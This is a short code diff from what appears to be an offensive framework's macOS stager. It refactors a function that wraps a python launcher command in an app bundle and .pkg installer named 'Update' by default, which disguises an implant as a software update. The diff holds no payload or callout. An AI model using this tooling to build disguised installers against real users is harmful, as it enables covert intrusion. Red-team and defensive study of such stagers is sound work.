@@ -89,21 +89,19 @@ class Stager:
             print(helpers.color("[!] Error in launcher command generation."))
             return ""
 
-        else:
-            if app_name == "":
-                app_name = "Update"
-            disarm = True
-            launcher_code = removeprefix(launcher, "echo ")
-            launcher_code = removesuffix(launcher_code, " | python3 &")
-            launcher_code = launcher_code.strip('"')
-            application_zip = self.mainMenu.stagergenv2.generate_appbundle(
-                launcher_code=launcher_code,
-                arch=arch,
-                icon=icns_path,
-                app_name=app_name,
-                disarm=disarm,
-            )
-            pkginstaller = self.mainMenu.stagergenv2.generate_pkg(
-                launcher=launcher, bundle_zip=application_zip, app_name=app_name
-            )
-            return pkginstaller
+        if app_name == "":
+            app_name = "Update"
+        disarm = True
+        launcher_code = removeprefix(launcher, "echo ")
+        launcher_code = removesuffix(launcher_code, " | python3 &")
+        launcher_code = launcher_code.strip('"')
+        application_zip = self.mainMenu.stagergenv2.generate_appbundle(
+            launcher_code=launcher_code,
+            arch=arch,
+            icon=icns_path,
+            app_name=app_name,
+            disarm=disarm,
+        )
+        return self.mainMenu.stagergenv2.generate_pkg(
+            launcher=launcher, bundle_zip=application_zip, app_name=app_name
+        )
